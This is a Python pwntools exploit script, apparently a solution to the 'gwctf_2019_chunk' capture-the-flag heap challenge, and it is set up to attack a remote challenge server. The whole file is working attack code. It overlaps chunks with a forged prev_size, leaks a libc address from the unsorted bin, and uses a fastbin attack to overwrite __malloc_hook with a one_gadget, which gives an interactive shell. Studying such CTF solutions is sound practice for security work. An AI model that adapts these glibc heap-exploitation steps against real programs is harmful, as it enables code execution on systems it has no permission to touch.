import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='./gwctf_2019_chunk'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',29680)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Give me a book ID: ',str(a))
			io.sendlineafter('how long: ',str(b))

		def delete(a):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Which one to throw?',str(a))

		def edit(a,c):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Which book to write?',str(a))
			io.sendafter('Content: ',c)

		def show(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Which book do you want to show?',str(a))
		



		add(0,0xf8)
		add(1,0x68)
		add(5,0x88)
		add(2,0xf8)
		add(3,0xf8)
		add(4,0xf8)
		edit(2,'\x00'*0xf0+p64(0x300))
		delete(0)
		delete(3)
		delete(1)
		add(0,0x88)
		show(0)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-0x10-1096
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()

		add(3,0xa8)
		edit(3,'\x00'*0x68+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23)+'\n')
		add(1,0x68)
		add(6,0x68)
		delete(3)
		delete(0)
		add(0,0xf8)
		add(3,0xf8)
		edit(6,'\x00'*0x13+p64(libc_base+one_gadgaet[2])+'\n')
		delete(1)
		delete(3)




		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue